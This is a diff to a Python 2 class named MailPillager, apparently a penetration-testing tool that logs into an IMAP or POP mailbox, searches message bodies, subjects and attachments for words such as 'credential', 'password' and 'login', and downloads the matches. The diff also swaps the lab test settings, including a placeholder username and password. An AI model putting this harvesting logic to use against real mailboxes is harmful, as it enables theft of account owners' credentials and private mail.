@@ -584,12 +584,12 @@ class  MailPillager():
 
             matched_messages = []
             matched_attachments = []
-            print "---------------Search Message Bodies [account, password, login]"
-            matched_messages.extend(mail_conn.searchMessageBodies(term=["account", "password", "login"]))
-            print "---------------Search Message Subjects [account, password, login]"
-            matched_messages.extend(mail_conn.searchMessageSubjects(term=["account", "password", "login"]))
-            print "---------------Search Message Attachments [account, password, login]"
-            matched_attachments.extend(mail_conn.searchMessageAttachments(term=["account", "password", "login"]))
+            print "---------------Search Message Bodies [credential, account, password, login]"
+            matched_messages.extend(mail_conn.searchMessageBodies(term=["credential", "account", "password", "login"]))
+            print "---------------Search Message Subjects [credential, account, password, login]"
+            matched_messages.extend(mail_conn.searchMessageSubjects(term=["credential", "account", "password", "login"]))
+            print "---------------Search Message Attachments [credential, account, password, login]"
+            matched_attachments.extend(mail_conn.searchMessageAttachments(term=["credential", "account", "password", "login"]))
             print "---------------Download Messages"
             for uid in set(matched_messages):
                 mail_conn.downloadMessage(uid)
@@ -630,13 +630,14 @@ class  MailPillager():
 # main test code
 #-----------------------------------------------------------------------------
 if __name__ == "__main__":
-    serverip = "10.0.0.101"
-    #username = "Adam.compton@example.com"
-    username = "Adam.Compton"
-    password = "password"
+    serverip = "172.16.170.135"
+    #username = "sjane@example.phish"
+    username = "sjane"
+    password = "passwordsally"
+    domain = "example.phish"
 
     mp = MailPillager()
-#    mp.pillage(username=username, password=password, server=serverip, port=143, domain="example.com")
-    mp.pillage(username=username, password=password, server=serverip, port=993, domain="example.com")
-#    mp.pillage(username=username, password=password, server=serverip, port=110, domain="example.com")
-#    mp.pillage(username=username, password=password, server=serverip, port=995, domain="example.com")
+#    mp.pillage(username=username, password=password, server=serverip, port=143, domain=domain)
+    mp.pillage(username=username, password=password, server=serverip, port=993, domain=domain)
+#    mp.pillage(username=username, password=password, server=serverip, port=110, domain=domain)
+#    mp.pillage(username=username, password=password, server=serverip, port=995, domain=domain)
